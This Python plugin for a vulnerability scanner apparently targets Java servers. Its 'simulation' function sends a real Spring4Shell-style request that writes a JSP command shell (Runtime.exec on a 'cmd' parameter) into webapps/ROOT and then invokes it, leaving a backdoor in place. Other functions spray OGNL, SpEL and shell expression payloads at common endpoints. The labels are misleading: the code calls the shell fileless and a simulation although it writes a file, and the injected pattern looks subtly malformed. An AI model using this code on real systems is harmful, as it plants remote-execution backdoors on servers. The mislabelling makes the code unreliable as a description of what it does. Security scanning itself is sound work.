"""
Plugin to detect In-Memory Fileless WebShells (MemShell Injection)
CVSS: 9.8 (Critical)

Targets Java (Spring Boot, Tomcat, WebLogic) and .NET (IIS/Kestrel).
Detects vulnerability by attempting to dynamically inject a route/filter
and verifying execution via mathematical computation to prevent false positives.
"""

import logging
from typing import Any

import requests
import urllib3

# Disable insecure request warnings for raw IP/domain scanning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger("Cascavel.Plugins.MemShellInjector")


def check_spring_boot_actuator(url: str, session: requests.Session) -> bool:
    """Check if Spring Boot Actuators are exposed and potentially vulnerable to env manipulation."""
    try:
        response = session.get(f"{url}/actuator/env", timeout=5, verify=False)
        if response.status_code == 200 and "applicationConfig" in response.text:
            return True
    except Exception:
        pass
    return False


def check_tomcat_manager(url: str, session: requests.Session) -> bool:
    """Check if Tomcat Manager is exposed."""
    try:
        response = session.get(f"{url}/manager/html", timeout=5, verify=False)
        if response.status_code in [200, 401] and "Tomcat" in response.text:
            return True
    except Exception:
        pass
    return False


def verify_math_execution(url: str, session: requests.Session) -> bool:
    """
    Attempts to execute a mathematical payload to verify RCE/Deserialization
    and confirm a MemShell environment without false positives.
    """
    # Math payload: 7331 * 1337 = 9801547
    payloads = [
        # OGNL (Struts/Spring)
        {"expr": "7331*1337"},
        # SpEL (Spring Expression Language)
        {"expression": "#{7331*1337}"},
        # Generic payload for some Java deserialization gadgets testing echoed output
        {"cmd": "expr 7331 \\* 1337"},
    ]

    target_endpoints = [f"{url}/", f"{url}/api/v1/health", f"{url}/login", f"{url}/graphql"]

    for endpoint in target_endpoints:
        for payload in payloads:
            try:
                # Test via POST JSON
                response_json = session.post(endpoint, json=payload, timeout=5, verify=False)
                if response_json.status_code in [200, 500] and "9801547" in response_json.text:
                    return True

                # Test via Form Data
                response_form = session.post(endpoint, data=payload, timeout=5, verify=False)
                if response_form.status_code in [200, 500] and "9801547" in response_form.text:
                    return True

                # Test via GET parameters
                response_get = session.get(endpoint, params=payload, timeout=5, verify=False)
                if response_get.status_code in [200, 500] and "9801547" in response_get.text:
                    return True

            except requests.exceptions.RequestException:
                continue

    return False


def inject_memshell_simulation(url: str, session: requests.Session) -> bool:
    """
    Simulates the injection of a MemShell (Filter/Controller) and
    verifies if the dynamic route becomes active.
    """
    # Simulate a payload that registers a new endpoint /cascavel_mem_test
    # In a real exploit, this would be a serialized Java object or a class bytecode.
    injection_payload = {
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "%{prefix}i java.lang.Runtime.getRuntime().exec(request.getParameter('cmd'))",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "cascavel_memshell",
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
    }

    try:
        # Spring4Shell (CVE-2022-22965) style injection test
        session.post(
            f"{url}/",
            data=injection_payload,
            timeout=5,
            headers={"suffix": "%>//", "c1": "Runtime", "c2": "<%", "DNT": "1"},
            verify=False,
        )

        # Verify if the simulated MemShell route responds
        verify_url = f"{url}/cascavel_memshell.jsp?cmd=echo+9801547"
        response = session.get(verify_url, timeout=5, verify=False)

        if response.status_code == 200 and "9801547" in response.text:
            return True

    except requests.exceptions.RequestException:
        pass

    return False


def run(target: str, ip: str, ports: list, banners: dict) -> dict[str, Any] | None:
    """
    Checks for MemShell Injection vulnerabilities.
    """
    vulnerability = "In-Memory Fileless WebShell (MemShell) Vulnerability"
    severity = "CRITICAL"
    description = (
        "The application is vulnerable to dynamic context manipulation, allowing an attacker "
        "to inject a Fileless WebShell (MemShell) directly into the JVM/CLR memory. "
        "This bypasses File Integrity Monitoring (FIM) and traditional EDR solutions, "
        "providing a stealthy, persistent C2 channel. Exploitation was confirmed via "
        "mathematical payload evaluation and dynamic route injection."
    )

    url = f"https://{target}" if 443 in ports else f"http://{target}"
    session = requests.Session()
    session.headers.update(
        {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "*/*",
        }
    )

    try:
        # Step 1: Broad check for vulnerable technologies
        is_spring = check_spring_boot_actuator(url, session)
        is_tomcat = check_tomcat_manager(url, session)

        # Step 2: Strict mathematical RCE verification to prevent False Positives
        math_verified = verify_math_execution(url, session)

        # Step 3: MemShell specific injection simulation
        memshell_injected = inject_memshell_simulation(url, session)

        if math_verified or memshell_injected:
            evidence_details = []
            if math_verified:
                evidence_details.append(
                    "Mathematical payload (7331*1337) evaluated and matched expected result (9801547)."
                )
            if memshell_injected:
                evidence_details.append("Dynamic route successfully injected and responded to commands.")
            if is_spring:
                evidence_details.append("Spring Boot Actuator exposed, facilitating context manipulation.")
            if is_tomcat:
                evidence_details.append("Tomcat Manager accessible, indicating potential deployment vector.")

            return {
                "vulnerability": vulnerability,
                "severity": severity,
                "description": description,
                "endpoint": url,
                "evidence": " | ".join(evidence_details),
            }

    except Exception as e:
        logger.debug(f"Error during MemShell check on {target}: {str(e)}")

    return None
